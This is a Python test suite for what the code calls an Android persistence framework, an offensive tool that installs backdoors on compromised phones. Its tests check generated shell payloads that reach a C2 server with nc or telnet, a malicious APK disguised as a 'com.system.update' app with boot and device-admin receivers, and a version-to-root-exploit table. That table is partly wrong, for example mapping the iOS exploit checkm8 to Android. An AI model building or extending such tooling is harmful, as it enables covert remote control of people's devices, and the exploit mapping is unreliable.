"""
Android Persistence Framework Test Suite
Tests all Android persistence methods and integration
"""

import pytest
import asyncio
from unittest.mock import Mock, patch
from datetime import datetime

from src.persistence.android_persistence import AndroidPersistence
from src.persistence.models import (
    CompromisedHost, PersistenceSession, PersistenceMethod, 
    PlatformType, PersistenceConfig
)
from src.persistence.persistence_manager import PersistenceManager


class TestAndroidPersistence:
    """Test Android persistence methods"""
    
    @pytest.fixture
    def android_host(self):
        """Create a test Android host"""
        return CompromisedHost(
            host_id="test-android-host",
            ip_address="192.168.1.100",
            hostname="android-device",
            platform=PlatformType.ANDROID,
            os_version="10.0",
            privileges="user",
            is_active=True
        )
    
    @pytest.fixture
    def persistence_session(self):
        """Create a test persistence session"""
        return PersistenceSession(
            session_id="test-session",
            c2_servers=["192.168.1.10:4444"],
            persistence_methods=[],
            stealth_mode=True
        )
    
    @pytest.fixture
    def persistence_config(self):
        """Create test persistence configuration"""
        return PersistenceConfig(
            max_concurrent_sessions=5,
            session_timeout=3600,
            heartbeat_interval=300
        )
    
    @pytest.fixture
    def android_persistence(self, persistence_config):
        """Create Android persistence instance"""
        return AndroidPersistence(persistence_config)
    
    @pytest.mark.asyncio
    async def test_android_adb_persistence(self, android_persistence, android_host, persistence_session):
        """Test ADB persistence method"""
        result = await android_persistence.apply_persistence(
            android_host, 
            PersistenceMethod.ANDROID_ADB, 
            persistence_session
        )
        
        assert result.success is True
        assert result.method == PersistenceMethod.ANDROID_ADB
        assert result.backdoor_info is not None
        assert result.backdoor_info.persistence_method == PersistenceMethod.ANDROID_ADB
        assert 'adb_injection' in result.backdoor_info.stealth_features
        assert len(result.cleanup_commands) > 0
        assert result.stealth_applied is True
        
        # Check additional data
        assert 'script_path' in result.additional_data
        assert 'commands' in result.additional_data
        assert result.additional_data['requires_adb'] is True
    
    @pytest.mark.asyncio
    async def test_android_root_exploit_persistence(self, android_persistence, android_host, persistence_session):
        """Test root exploit persistence method"""
        result = await android_persistence.apply_persistence(
            android_host, 
            PersistenceMethod.ANDROID_ROOT_EXPLOIT, 
            persistence_session
        )
        
        assert result.success is True
        assert result.method == PersistenceMethod.ANDROID_ROOT_EXPLOIT
        assert result.backdoor_info is not None
        assert result.backdoor_info.persistence_method == PersistenceMethod.ANDROID_ROOT_EXPLOIT
        assert 'root_exploit' in result.backdoor_info.stealth_features
        assert len(result.cleanup_commands) > 0
        assert result.stealth_applied is True
        
        # Check additional data
        assert 'script_path' in result.additional_data
        assert 'exploit_name' in result.additional_data
        assert result.additional_data['requires_root'] is True
    
    @pytest.mark.asyncio
    async def test_android_app_persistence(self, android_persistence, android_host, persistence_session):
        """Test app persistence method"""
        result = await android_persistence.apply_persistence(
            android_host, 
            PersistenceMethod.ANDROID_APP_PERSISTENCE, 
            persistence_session
        )
        
        assert result.success is True
        assert result.method == PersistenceMethod.ANDROID_APP_PERSISTENCE
        assert result.backdoor_info is not None
        assert result.backdoor_info.persistence_method == PersistenceMethod.ANDROID_APP_PERSISTENCE
        assert 'android_app' in result.backdoor_info.stealth_features
        assert len(result.cleanup_commands) > 0
        assert result.stealth_applied is True
        
        # Check additional data
        assert 'app_name' in result.additional_data
        assert 'apk_path' in result.additional_data
        assert result.additional_data['app_name'].startswith('com.system.update.')
    
    @pytest.mark.asyncio
    async def test_unsupported_method(self, android_persistence, android_host, persistence_session):
        """Test unsupported persistence method"""
        result = await android_persistence.apply_persistence(
            android_host, 
            PersistenceMethod.WINDOWS_REGISTRY,  # Unsupported on Android
            persistence_session
        )
        
        assert result.success is False
        assert "Unsupported Android method" in result.error_message
    
    def test_android_payload_generation(self, android_persistence, android_host, persistence_session):
        """Test Android payload generation"""
        payload = android_persistence._generate_android_payload(android_host, persistence_session)
        
        assert isinstance(payload, str)
        assert len(payload) > 100  # Should be substantial
        assert "192.168.1.10" in payload  # C2 server IP
        assert "4444" in payload  # C2 server port
        assert "#!/system/bin/sh" in payload  # Shell script header
        assert "nc" in payload or "telnet" in payload  # Network tools
    
    def test_root_payload_generation(self, android_persistence, android_host, persistence_session):
        """Test root payload generation"""
        payload = android_persistence._generate_root_payload(android_host, persistence_session)
        
        assert isinstance(payload, str)
        assert len(payload) > 100  # Should be substantial
        assert "192.168.1.10" in payload  # C2 server IP
        assert "4444" in payload  # C2 server port
        assert "#!/system/bin/sh" in payload  # Shell script header
    
    def test_malicious_apk_generation(self, android_persistence, android_host, persistence_session):
        """Test malicious APK generation"""
        app_name = "com.system.update.test123"
        apk_content = android_persistence._generate_malicious_apk(android_host, persistence_session, app_name)
        
        assert isinstance(apk_content, bytes)
        assert len(apk_content) > 1000  # Should be substantial
        
        # Convert to string for content checks
        apk_str = apk_content.decode('utf-8')
        assert app_name in apk_str
        assert "AndroidManifest.xml" in apk_str
        assert "MainActivity.java" in apk_str
        assert "PersistenceService.java" in apk_str
        assert "BootReceiver.java" in apk_str
        assert "AdminReceiver.java" in apk_str
        assert "192.168.1.10" in apk_str  # C2 server IP
        assert "4444" in apk_str  # C2 server port
    
    def test_android_version_detection(self, android_persistence, android_host):
        """Test Android version detection"""
        version = android_persistence._get_android_version(android_host)
        assert version == "10.0"
        
        # Test with unknown version
        android_host.os_version = None
        version = android_persistence._get_android_version(android_host)
        assert version == "unknown"
    
    def test_root_exploit_selection(self, android_persistence):
        """Test root exploit selection based on Android version"""
        test_cases = [
            ("4.0", "dirtycow"),
            ("4.4", "towelroot"),
            ("5.0", "stagefright"),
            ("6.0", "quadrooter"),
            ("7.0", "drammer"),
            ("8.0", "blueborne"),
            ("9.0", "checkm8"),
            ("10.0", "checkm8"),
            ("unknown", "generic")
        ]
        
        for version, expected_exploit in test_cases:
            exploit = android_persistence._select_root_exploit(version)
            assert exploit == expected_exploit
    
    def test_adb_connection_check(self, android_persistence, android_host):
        """Test ADB connection check"""
        # This is a placeholder test since the actual implementation would require ADB
        result = android_persistence._check_adb_connection(android_host)
        assert isinstance(result, bool)
    
    def test_root_access_check(self, android_persistence, android_host):
        """Test root access check"""
        # Test with user privileges
        result = android_persistence._check_root_access(android_host)
        assert result is False
        
        # Test with root privileges
        android_host.privileges = 'root'
        result = android_persistence._check_root_access(android_host)
        assert result is True
    
    @pytest.mark.asyncio
    async def test_exploit_deployment(self, android_persistence, android_host):
        """Test exploit deployment"""
        result = await android_persistence._deploy_exploit(android_host, "dirtycow")
        assert isinstance(result, bool)


class TestAndroidPersistenceIntegration:
    """Test Android persistence integration with PersistenceManager"""
    
    @pytest.fixture
    def persistence_config(self):
        """Create test persistence configuration"""
        return PersistenceConfig()
    
    @pytest.fixture
    def persistence_manager(self):
        """Create persistence manager instance"""
        return PersistenceManager()
    
    @pytest.fixture
    def android_host(self):
        """Create a test Android host"""
        return CompromisedHost(
            host_id="test-android-host",
            ip_address="192.168.1.100",
            hostname="android-device",
            platform=PlatformType.ANDROID,
            os_version="10.0",
            privileges="user",
            is_active=True
        )
    
    def test_android_method_mapping(self, persistence_manager):
        """Test Android method name to enum mapping"""
        test_cases = [
            ('adb', PersistenceMethod.ANDROID_ADB),
            ('root_exploit', PersistenceMethod.ANDROID_ROOT_EXPLOIT),
            ('app_persistence', PersistenceMethod.ANDROID_APP_PERSISTENCE),
        ]
        
        for method_name, expected_enum in test_cases:
            result = persistence_manager._method_name_to_enum(method_name, 'android')
            assert result == expected_enum
    
    @pytest.mark.asyncio
    async def test_android_persistence_application(self, persistence_manager, android_host):
        """Test applying Android persistence through manager"""
        methods = ['adb', 'root_exploit', 'app_persistence']
        c2_servers = ['192.168.1.10:4444']
        
        results = await persistence_manager.apply_persistence(
            android_host, 
            methods, 
            c2_servers
        )
        
        assert len(results) == 3
        for result in results:
            assert result.success is True
            assert result.host_id == android_host.host_id
            assert result.method.value.startswith('android_')


if __name__ == "__main__":
    print("🚀 Android Persistence Framework Test Suite")
    print("=" * 60)
    
    # Test payload generation
    print("\n🔧 Testing Payload Generation")
    print("=" * 50)
    
    config = PersistenceConfig()
    android_persistence = AndroidPersistence(config)
    
    host = CompromisedHost(
        host_id="test-host",
        ip_address="192.168.1.100",
        platform=PlatformType.ANDROID,
        os_version="10.0"
    )
    
    session = PersistenceSession(c2_servers=["192.168.1.10:4444"])
    
    print("📝 Testing Android payload generation...")
    payload = android_persistence._generate_android_payload(host, session)
    print(f"  ✅ Generated {len(payload)} characters")
    
    print("📝 Testing root payload generation...")
    root_payload = android_persistence._generate_root_payload(host, session)
    print(f"  ✅ Generated {len(root_payload)} characters")
    
    print("📝 Testing APK source generation...")
    apk_content = android_persistence._generate_malicious_apk(host, session, "com.system.update.test")
    print(f"  ✅ Generated {len(apk_content)} characters")
    
    print("🎉 All payload generation tests passed!")
    
    # Test Android persistence methods
    print("\n🤖 Testing Android Persistence Framework")
    print("=" * 50)
    
    async def test_android_methods():
        methods_to_test = [
            (PersistenceMethod.ANDROID_ADB, "android_adb"),
            (PersistenceMethod.ANDROID_ROOT_EXPLOIT, "android_root_exploit"),
            (PersistenceMethod.ANDROID_APP_PERSISTENCE, "android_app_persistence"),
        ]
        
        successful = 0
        total = len(methods_to_test)
        
        for method_enum, method_name in methods_to_test:
            try:
                result = await android_persistence.apply_persistence(host, method_enum, session)
                if result.success:
                    print(f"📋 Testing {method_name}...          ✅ Success!")
                    successful += 1
                else:
                    print(f"📋 Testing {method_name}...          ❌ Failed: {result.error_message}")
            except Exception as e:
                print(f"📋 Testing {method_name}...          ❌ Error: {e}")
        
        print(f"\n📊 Summary")
        print(f"Total methods tested: {total}")
        print(f"Successful: {successful}")
        print(f"Failed: {total - successful}")
        
        if successful == total:
            print("🎉 All Android persistence methods working correctly!")
        else:
            print("⚠️  Some Android persistence methods failed!")
    
    asyncio.run(test_android_methods())
    
    # Test method mappings
    print("\n🗺️  Testing Android Method Mappings")
    print("=" * 50)
    
    manager = PersistenceManager()
    
    android_mappings = [
        ('adb', PersistenceMethod.ANDROID_ADB, 'android_adb'),
        ('root_exploit', PersistenceMethod.ANDROID_ROOT_EXPLOIT, 'android_root_exploit'),
        ('app_persistence', PersistenceMethod.ANDROID_APP_PERSISTENCE, 'android_app_persistence'),
    ]
    
    successful_mappings = 0
    
    for method_name, expected_enum, expected_value in android_mappings:
        try:
            result_enum = manager._method_name_to_enum(method_name, 'android')
            if result_enum == expected_enum:
                print(f"  ✅ {expected_enum.name} -> {expected_value}")
                successful_mappings += 1
            else:
                print(f"  ❌ {method_name} -> {result_enum} (expected {expected_enum})")
        except Exception as e:
            print(f"  ❌ {method_name} -> Error: {e}")

    print(f"\n🔧 Testing Persistence Manager Method Mapping")
    for method_name, expected_enum, expected_value in android_mappings:
        try:
            result_enum = manager._method_name_to_enum(method_name, 'android')
            if result_enum == expected_enum:
                print(f"  ✅ '{method_name}' -> {expected_value}")
            else:
                print(f"  ❌ '{method_name}' -> {result_enum.value} (expected {expected_value})")
        except Exception as e:
            print(f"  ❌ '{method_name}' -> Error: {e}")
    
    print(f"\nSuccessful mappings: {successful_mappings}/{len(android_mappings)}")
    
    if successful_mappings == len(android_mappings):
        print("🎉 All Android method mappings work correctly!")
    else:
        print("⚠️  Some Android method mappings failed!")
